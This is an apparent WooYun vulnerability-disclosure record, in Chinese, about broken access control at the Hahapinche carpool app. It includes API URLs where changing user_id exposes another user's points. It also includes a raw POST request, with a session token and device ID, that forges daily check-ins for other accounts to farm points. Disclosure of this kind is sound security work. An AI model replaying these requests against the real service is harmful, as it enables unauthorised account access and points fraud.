{"id": 51363, "wybug_id": "wooyun-2014-074794", "wybug_title": "哈哈拼车两处越权可刷积分", "wybug_corp": "chepinhui.com", "wybug_author": "啊L川", "wybug_date": "2014-09-02 19:05", "wybug_open_date": "2014-10-17 19:06", "wybug_type": "未授权访问/权限绕过", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误", "越权操作"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-02：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-12：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-22：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-02：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-17：\t细节向公众公开  简要描述： 我的积分功能，可越权查看其他用户的积分，打开处，没有对用户做判断，可实现全部会员打卡 详细说明：  积分越权  http://api3.hahapinche.com/api.php/Mobile/Html/my_score?user_id=39114  我的积分 http://api3.hahapinche.com/api.php/Mobile/Html/my_score?user_id=39113  此用户开始没有积分  通过帮助用户打卡 用户得到了两个积分，，，打卡越权请求 \nPOST /api.php/Mobile/Sign/sign_up HTTP/1.1Host: api3.hahapinche.comAccept-Language: zh-cnUser-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Mobile/11D257X-Requested-With: XMLHttpRequestAccept: application/json, text/javascript, */*; q=0.01Referer: http://api3.hahapinche.com/api.php/Mobile/Sign/show_sign_up?user_id=39114&user_token=ae40d6941c1d840e3cfb453da06e8460&hwid=C0448591-7AA5-4A40-975C-1F0425AC31A6Content-Type: application/x-www-form-urlencodedConnection: keep-aliveProxy-Connection: keep-aliveContent-Length: 35Origin: http://api3.hahapinche.comAccept-Encoding: gzip, deflateuser_id=39113&r=0.17960040038451552\n改变user_id即可实现打卡  刷积分   漏洞证明：  \n\n\n\n   修复方案：  加强权限验证    版权声明：转载请注明来源 啊L川@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-09-02 19:24 厂商回复： 模拟用户签到骗取积分 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}